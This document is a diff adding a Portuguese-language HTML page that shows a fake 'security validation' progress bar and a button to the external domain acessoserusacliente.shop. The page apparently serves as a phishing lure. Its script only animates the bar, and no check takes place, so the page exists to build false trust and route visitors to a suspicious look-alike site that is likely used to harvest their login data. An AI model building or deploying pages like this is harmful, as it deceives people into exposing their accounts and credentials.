@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Acesso em Verificação</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    min-height:100vh;
+    font-family:'Poppins',sans-serif;
+    background:radial-gradient(circle at top,#022c22,#020617);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.card{
+    width:92%;
+    max-width:420px;
+    background:rgba(2,12,23,.75);
+    backdrop-filter:blur(14px);
+    border-radius:26px;
+    padding:40px 28px;
+    border:1px solid rgba(255,255,255,.08);
+    box-shadow:0 40px 120px rgba(0,0,0,.8);
+}
+
+.top{
+    text-align:center;
+    margin-bottom:28px;
+}
+
+.icon{
+    width:70px;
+    height:70px;
+    margin:0 auto 16px;
+    border-radius:20px;
+    background:linear-gradient(135deg,#22c55e,#4ade80);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:28px;
+    font-weight:700;
+    color:#022c22;
+}
+
+h1{
+    margin:0;
+    font-size:21px;
+    font-weight:700;
+    color:#ecfdf5;
+}
+
+.desc{
+    margin-top:10px;
+    font-size:14px;
+    color:#a7f3d0;
+}
+
+.progress-box{
+    margin-top:26px;
+}
+
+.progress{
+    width:100%;
+    height:10px;
+    background:#022c22;
+    border-radius:20px;
+    overflow:hidden;
+}
+
+.progress span{
+    display:block;
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#22c55e,#86efac);
+    transition:width .3s ease;
+}
+
+.percent{
+    margin-top:10px;
+    font-size:13px;
+    color:#86efac;
+    text-align:center;
+    font-weight:600;
+}
+
+.btn{
+    margin-top:34px;
+    display:block;
+    width:100%;
+    padding:18px;
+    border-radius:18px;
+    background:linear-gradient(135deg,#22c55e,#4ade80);
+    color:#022c22;
+    font-weight:700;
+    font-size:15px;
+    text-align:center;
+    text-decoration:none;
+    transition:.25s;
+}
+
+.btn:hover{
+    transform:scale(1.03);
+    box-shadow:0 20px 50px rgba(34,197,94,.5);
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="top">
+        <div class="icon">✔</div>
+        <h1>Processando acesso</h1>
+        <div class="desc">
+            Aguarde enquanto validamos suas informações de segurança.
+        </div>
+    </div>
+
+    <div class="progress-box">
+        <div class="progress">
+            <span id="bar"></span>
+        </div>
+        <div class="percent" id="text">0%</div>
+    </div>
+
+    <a href="https://acessoserusacliente.shop/" class="btn">
+        ACESSAR AGORA
+    </a>
+</div>
+
+<script>
+let v = 0;
+const bar = document.getElementById("bar");
+const text = document.getElementById("text");
+
+const load = setInterval(()=>{
+    v++;
+    bar.style.width = v + "%";
+    text.innerText = v + "%";
+    if(v >= 100) clearInterval(load);
+}, 30);
+</script>
+
+</body>
+</html>
